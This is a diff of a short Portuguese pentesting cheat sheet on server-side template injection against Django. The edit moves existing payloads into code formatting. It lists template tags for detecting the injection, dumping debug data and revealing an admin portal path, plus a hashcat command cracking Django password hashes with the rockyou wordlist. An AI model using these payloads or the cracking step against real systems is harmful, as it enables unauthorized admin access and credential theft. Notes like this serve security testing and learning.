@@ -1,10 +1,10 @@
 # Injeção de Modelo no Servidor
 
-**Detecção:** <mark style="color:red;background-color:yellow;">\{% if 'ahsan' == 'ahsan' %\} a \{% endif %\}</mark>
+**Detecção:** `{% if 'ahsan' == 'ahsan' %} a {% endif %}`
 
-**Depuração:** \{% debug %\}&#x20;
+**Depuração:** `{% debug %}`
 
-**Divulgando Portal do Admin:** \{% include 'admin/base.html' %\} <mark style="color:green;">= /secret-admin-portal</mark>
+**Divulgando Portal do Admin:** `{% include 'admin/base.html' %}` <mark style="color:green;">= /secret-admin-portal</mark>
 
 
 
@@ -22,6 +22,6 @@
 
 **Descriptografado usando Hashcat:**&#x20;
 
-hashcat -m 10000 hashed\_passwords rockyou. txt <mark style="color:green;">= Django Admin Panel Pwn</mark>
+`hashcat -m 10000 hashed_passwords rockyou. txt` <mark style="color:green;">= Django Admin Panel Pwn</mark>
 
 [^1]: 
